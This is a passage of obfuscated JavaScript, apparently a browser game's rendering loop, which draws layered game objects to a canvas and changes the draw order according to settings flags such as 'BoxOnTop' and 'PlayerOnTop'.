			for (var ⵠᐃ = ᐃΔΔ; ᐃΔⲆΔΔᐃⲆ.length > ⵠᐃ; ⵠᐃ++)(ΔⲆⵠⲆ === (ᐃΔⲆΔΔᐃⲆ[ⵠᐃ].info & 15) || ᐃΔⲆΔΔᐃⲆ[ⵠᐃ].info === ᐃⵠΔⵠⵠ) && ⵠⵠᐃⲆ(ᐃΔⲆΔΔᐃⲆ[ⵠᐃ]);
			var ⵠⲆⵠⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆⲆΔ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ⵠⲆⵠⵠᐃ.length; ⵠᐃ++)((ⵠⲆⵠⵠᐃ[ⵠᐃ].info & 15) === ⵠⲆᐃⵠ || ᐃΔᐃΔⲆ === ⵠⲆⵠⵠᐃ[ⵠᐃ].info) && ⵠⵠᐃⲆ(ⵠⲆⵠⵠᐃ[ⵠᐃ]);
			var ⲆΔΔΔⵠΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠᐃΔ];
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ⲆΔΔΔⵠΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔΔⵠΔⵠ[ⵠᐃ], Ⲇ.ⲆⵠⲆΔⲆ);
			var ᐃⲆᐃⲆⲆⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⲆⵠⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⲆᐃⲆⲆⲆⲆ.length; ⵠᐃ++)(0 === (ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ].info & 15) || ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ].info === ⵠⵠⲆΔΔ) && ⵠⵠᐃⲆ(ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ]);
			var ⵠᐃᐃⲆⲆⲆΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⵠⲆ];
			for (var ⵠᐃ = ΔⲆⵠⲆ; ⵠᐃ < ⵠᐃᐃⲆⲆⲆΔ.length; ⵠᐃ++)
				if ((ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ].info & 15) === 0 || ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ].info === ⲆⵠⲆᐃⲆ) ⵠⵠᐃⲆ(ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ]);
			var ⲆΔΔⲆΔⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⲆⵠ];
			for (var ⵠᐃ = 0; ⲆΔΔⲆΔⲆⲆ.length > ⵠᐃ; ⵠᐃ++)
				if ((ⲆΔΔⲆΔⲆⲆ[ⵠᐃ].info & 15) === 0 || ΔᐃⲆⲆⵠ === ⲆΔΔⲆΔⲆⲆ[ⵠᐃ].info) ⵠⵠᐃⲆ(ⲆΔΔⲆΔⲆⲆ[ⵠᐃ]);
			var ⲆΔΔΔⵠΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆΔⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔΔΔⵠΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔΔⵠΔⵠ[ⵠᐃ]);
			if (!Settings.BoxOnTop.enabled) {
				var ⲆᐃⲆⲆᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆΔᐃ];
				for (var ⵠᐃ = ⲆⲆⲆᐃ; ⲆᐃⲆⲆᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆᐃⲆⲆᐃ[ⵠᐃ], Ⲇ.ⲆᐃⲆΔᐃ, Ⲇ.ᐃᐃⲆⵠᐃⲆⵠ);
				var ⲆΔⵠΔⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ];
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔⵠΔⲆⵠᐃ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔⵠΔⲆⵠᐃ[ⵠᐃ], Ⲇ.ⲆᐃⲆΔᐃ, Ⲇ.ᐃᐃⲆⵠᐃⲆⵠ);
				var ⵠᐃᐃⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆΔⵠΔ];
				for (var ⵠᐃ = 0; ⵠᐃ < ⵠᐃᐃⲆΔΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠᐃᐃⲆΔΔⲆ[ⵠᐃ], Ⲇ.ᐃⲆΔⵠΔ, Ⲇ.ΔΔᐃΔΔᐃⲆ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔΔⲆ];
			for (var ⵠᐃ = ⵠⲆⲆ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				if (ⲆⲆΔΔ[ⵠᐃ].info & ⵠⲆΔ) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ⵠᐃΔᐃΔΔᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ];
			for (var ⵠᐃ = Δᐃᐃⵠ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info & ⲆⵠⲆⲆ && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔᐃⵠᐃΔⲆΔ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃΔΔⲆ];
			for (var ⵠᐃ = 0; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔΔᐃⲆᐃᐃᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔᐃⵠᐃⲆⵠᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ];
			for (var ⵠᐃ = 0; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ⵠⵠⵠⵠᐃΔⵠ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ];
			for (var ⵠᐃ = ΔΔⵠ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔΔᐃⲆᐃᐃᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ];
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (ⲆⲆΔΔ[ⵠᐃ].info & ΔⵠΔⵠ) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ⵠᐃΔᐃΔΔᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⵠΔΔ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (ⲆⲆΔΔ[ⵠᐃ].info & ΔᐃⲆⵠ) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔᐃⵠᐃΔⲆΔ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ];
			for (var ⵠᐃ = Ⲇᐃⵠⵠ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				if (ⲆⲆΔΔ[ⵠᐃ].info) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔΔᐃⲆᐃᐃᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔᐃⵠᐃⲆⵠᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ];
			for (var ⵠᐃ = Δᐃᐃⵠ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ⵠⵠⵠⵠᐃΔⵠ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔΔⵠ];
			for (var ⵠᐃ = 0; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⲆⲆΔΔ[ⵠᐃ].info && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Ⲇ.ΔΔᐃⲆᐃᐃᐃ)
			}
			var ᐃⵠⲆΔᐃΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃⲆᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⵠⲆΔᐃΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃⵠⲆΔᐃΔⵠ[ⵠᐃ], Ⲇ.ᐃᐃᐃⲆᐃ, Ⲇ.ⵠⵠᐃΔΔⲆⵠ);
			var ΔⲆⲆΔᐃΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆΔ];
			for (var ⵠᐃ = Ⲇᐃⵠⵠ; ΔⲆⲆΔᐃΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ΔⲆⲆΔᐃΔⲆ[ⵠᐃ], Ⲇ.ⲆⲆⲆⲆΔ);
			var ᐃⵠΔⵠⵠᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ];
			for (var ⵠᐃ = 0; ᐃⵠΔⵠⵠᐃⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃⵠΔⵠⵠᐃⵠ[ⵠᐃ], Ⲇ.ⲆᐃⲆⲆⵠᐃΔ, Ⲇ.ᐃⲆⵠΔⲆΔᐃΔΔ);
			var ⲆⵠⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ⲆⵠⲆⵠᐃ.length; ⵠᐃ++) {
				if (ⲆⵠⲆⵠᐃ[ⵠᐃ].ΔⵠΔⲆΔᐃᐃ === Ⲇᐃᐃᐃ) ⵠⵠᐃⲆ(ⲆⵠⲆⵠᐃ[ⵠᐃ])
			}
			if (!Settings.PlayerOnTop.enabled) {
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
				for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
					if (ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ⵠⲆᐃⲆᐃ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ΔⵠⵠΔⲆ && ᐃᐃ.ΔΔΔⲆⲆ !== ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ΔᐃⲆΔᐃ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ⲆᐃᐃⵠⲆ) {
						if (ᐃⲆⲆ.ⵠⵠⵠΔⵠΔⵠ === Δᐃᐃⵠ) {
							if (.001 < ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ) {
								ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, 0, .018);
								var ᐃⵠΔⵠ = 1 + .18 * Math.min(1, Math.max(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, 0) / ⵠᐃⲆΔΔ);
								Δ.save();
								Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
								ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
								ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
								ᐃⲆⲆ.ΔᐃΔⵠ();
								ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
								ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
								Δ.restore()
							} else {
								ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ = 0;
								ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
								ᐃⲆⲆ.ΔᐃΔⵠ()
							}
						}
					} else if (180 >= ᐃⲆⲆ.ᐃᐃΔᐃᐃ) {
						Δ.save();
						var ᐃⵠΔⵠ = ΔⵠⲆΔ + Math.min(1, Math.max(ᐃⲆⲆ.ⲆⲆᐃΔⵠ - 30, ΔⲆⲆ) / 180) * .35;
						Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
						ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
						ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ = ᐃΔΔ;
						ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
						ᐃⲆⲆ.ΔᐃΔⵠ();
						ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
						ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
						Δ.restore()
					}
				}
			}
			var ΔⲆⲆΔᐃΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆΔ];
			for (var ⵠᐃ = 0; ΔⲆⲆΔᐃΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ΔⲆⲆΔᐃΔⲆ[ⵠᐃ], Ⲇ.ⵠΔⲆⵠⲆⲆⵠ);
			var ⵠᐃΔΔⲆᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃᐃΔ];
			for (var ⵠᐃ = ΔΔⵠⵠ; ⵠᐃ < ⵠᐃΔΔⲆᐃⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠᐃΔΔⲆᐃⵠ[ⵠᐃ]);
			var ⲆⲆⲆᐃΔⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠᐃⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⲆᐃΔⵠⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆⲆⲆᐃΔⵠⵠ[ⵠᐃ], Ⲇ.ᐃⵠⵠᐃⵠ, Ⲇ.ⵠⵠⲆⵠⵠΔⵠ);
			var ΔᐃⲆΔΔⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠⵠ];
			for (var ⵠᐃ = 0; ΔᐃⲆΔΔⵠᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ΔᐃⲆΔΔⵠᐃ[ⵠᐃ]);
			var ΔᐃᐃΔⵠⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃⲆᐃ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ΔᐃᐃΔⵠⵠⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔᐃᐃΔⵠⵠⵠ[ⵠᐃ], Ⲇ.ΔⵠᐃⲆᐃ, Ⲇ.ⲆⲆⲆⵠⲆΔⲆ);
			var ᐃⵠⲆᐃᐃⲆᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆᐃⲆᐃ];
			for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < ᐃⵠⲆᐃᐃⲆᐃ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃⵠⲆᐃᐃⲆᐃ[ⵠᐃ], Ⲇ.ⵠⲆᐃⲆᐃ, Ⲇ.ⲆᐃⲆⲆⲆᐃΔ);
			var ΔⲆⵠⲆΔⵠⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠΔⲆ];
			for (var ⵠᐃ = ⵠⲆᐃⵠ; ΔⲆⵠⲆΔⵠⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ΔⲆⵠⲆΔⵠⲆ[ⵠᐃ], Ⲇ.ΔⵠⵠΔⲆ, Ⲇ.ⵠⵠΔⵠΔΔᐃ);
			var ΔⵠⵠΔⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆᐃⵠ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ΔⵠⵠΔⲆⵠᐃ.length; ⵠᐃ++)
				if (ⵠᐃⲆᐃ !== (ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ].info & 15) && ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ].info !== 10) ⵠⵠᐃⲆ(ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ]);
			var ᐃΔⲆΔΔᐃⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⵠⲆ];
			for (var ⵠᐃ = 0; ᐃΔⲆΔΔᐃⲆ.length > ⵠᐃ; ⵠᐃ++)
				if ((ᐃΔⲆΔΔᐃⲆ[ⵠᐃ].info & 15) !== ᐃⵠⲆ && ᐃΔⲆΔΔᐃⲆ[ⵠᐃ].info !== 10) ⵠⵠᐃⲆ(ᐃΔⲆΔΔᐃⲆ[ⵠᐃ]);
			var ⵠⲆⵠⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆΔᐃΔ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⵠⲆⵠⵠᐃ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠⲆⵠⵠᐃ[ⵠᐃ], Ⲇ.ⵠⵠᐃⲆᐃ);
			var ⵠⲆⵠⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆⲆΔ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ⵠⲆⵠⵠᐃ.length; ⵠᐃ++)
				if (ⵠⲆⲆ !== (ⵠⲆⵠⵠᐃ[ⵠᐃ].info & 15) && ⲆΔΔᐃᐃ !== ⵠⲆⵠⵠᐃ[ⵠᐃ].info) ⵠⵠᐃⲆ(ⵠⲆⵠⵠᐃ[ⵠᐃ]);
			var ΔⵠⲆᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃΔ];
			for (var ⵠᐃ = 0; ΔⵠⲆᐃⵠ.length > ⵠᐃ; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ΔⵠⲆᐃⵠ[ⵠᐃ]);
			var ᐃⲆᐃⲆⲆⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⲆⵠⲆ];
			for (var ⵠᐃ = 0; ᐃⲆᐃⲆⲆⲆⲆ.length > ⵠᐃ; ⵠᐃ++)(ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ].info & 15) !== ⲆⲆⲆᐃ && 10 !== ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ].info && ⵠⵠᐃⲆ(ᐃⲆᐃⲆⲆⲆⲆ[ⵠᐃ]);
			var ⵠᐃᐃⲆⲆⲆΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⵠⲆ];
			for (var ⵠᐃ = 0; ⵠᐃᐃⲆⲆⲆΔ.length > ⵠᐃ; ⵠᐃ++)
				if ((ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ].info & 15) !== ⵠⲆⲆ && ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ].info !== 10) ⵠⵠᐃⲆ(ⵠᐃᐃⲆⲆⲆΔ[ⵠᐃ]);
			var ⲆΔΔⲆΔⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⲆⵠ];
			for (var ⵠᐃ = Δᐃᐃⵠ; ⲆΔΔⲆΔⲆⲆ.length > ⵠᐃ; ⵠᐃ++)
				if ((ⲆΔΔⲆΔⲆⲆ[ⵠᐃ].info & 15) !== Ⲇᐃⵠⵠ && 10 !== ⲆΔΔⲆΔⲆⲆ[ⵠᐃ].info) ⵠⵠᐃⲆ(ⲆΔΔⲆΔⲆⲆ[ⵠᐃ]);
			var ΔᐃⵠΔⵠᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠΔ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ΔᐃⵠΔⵠᐃⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔᐃⵠΔⵠᐃⵠ[ⵠᐃ], Ⲇ.ⵠᐃⵠⵠΔ, Ⲇ.ᐃⲆⲆⵠᐃⲆΔ);
			var Δᐃᐃᐃⵠⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔΔᐃΔ];
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < Δᐃᐃᐃⵠⵠⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(Δᐃᐃᐃⵠⵠⵠ[ⵠᐃ], Ⲇ.ᐃΔΔᐃΔ, Ⲇ.ᐃᐃᐃᐃⵠⵠᐃ);
			var ⲆⲆⵠᐃΔᐃᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⲆⵠ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ⲆⲆⵠᐃΔᐃᐃ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆⲆⵠᐃΔᐃᐃ[ⵠᐃ], Ⲇ.ᐃΔⵠⲆⵠ, Ⲇ.ᐃΔᐃᐃᐃΔⵠ);
			var ⵠΔΔᐃⲆΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃⲆ];
			for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠᐃ < ⵠΔΔᐃⲆΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠΔΔᐃⲆΔⵠ[ⵠᐃ], Ⲇ.ⲆⲆⵠᐃⲆ, Ⲇ.ᐃᐃᐃΔΔΔΔ);
			var ᐃΔΔⲆᐃΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⵠⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃΔΔⲆᐃΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃΔΔⲆᐃΔⵠ[ⵠᐃ], Ⲇ.ΔⵠΔⵠⵠ, Ⲇ.ᐃᐃΔΔⵠᐃΔ);
			var ⲆΔⲆⲆⲆⵠΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔᐃΔ];
			for (var ⵠᐃ = ΔΔⵠⵠ; ⲆΔⲆⲆⲆⵠΔ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔⲆⲆⲆⵠΔ[ⵠᐃ], Ⲇ.ⲆⵠΔᐃΔ, Ⲇ.ⲆⲆⵠᐃⲆᐃᐃ);
			var ΔΔⵠⵠⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⵠⲆ];
			for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠᐃ < ΔΔⵠⵠⲆΔΔ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔΔⵠⵠⲆΔΔ[ⵠᐃ]);
			var ᐃΔⲆⵠⵠΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃᐃΔ];
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ᐃΔⲆⵠⵠΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃΔⲆⵠⵠΔⲆ[ⵠᐃ], Ⲇ.ⵠⵠⵠⵠⵠⲆⲆ, Ⲇ.ⵠᐃⵠⲆⵠⵠΔ);
			var ⲆⲆᐃΔΔⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃᐃΔ];
			for (var ⵠᐃ = ᐃⵠΔ; ⲆⲆᐃΔΔⵠⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆⲆᐃΔΔⵠⵠ[ⵠᐃ]);
			var ᐃⵠⵠⵠⲆΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃΔᐃ];
			for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ᐃⵠⵠⵠⲆΔⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃⵠⵠⵠⲆΔⵠ[ⵠᐃ], Ⲇ.ᐃᐃᐃΔᐃ, Ⲇ.ⲆΔᐃⲆⵠᐃᐃ);
			var ΔⲆⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔⲆⲆⵠⵠ.length; ⵠᐃ++) {
				if (ΔⲆⲆⵠⵠ[ⵠᐃ].scale === 1) ⵠⵠᐃⲆ(ΔⲆⲆⵠⵠ[ⵠᐃ], Ⲇ.ΔΔⵠΔΔ, Ⲇ.ⵠⲆᐃⲆᐃΔⵠ)
			}
			var ΔⲆⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ];
			for (var ⵠᐃ = ⵠⲆⲆ; ΔⲆⲆⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
				if (ΔⲆⲆⵠⵠ[ⵠᐃ].scale === ᐃΔᐃⲆ) ⵠⵠᐃⲆ(ΔⲆⲆⵠⵠ[ⵠᐃ], Ⲇ.ⲆᐃⲆᐃⵠ, Ⲇ.ΔΔⵠᐃⵠⵠⲆ)
			}
			var ⲆᐃⲆΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ];
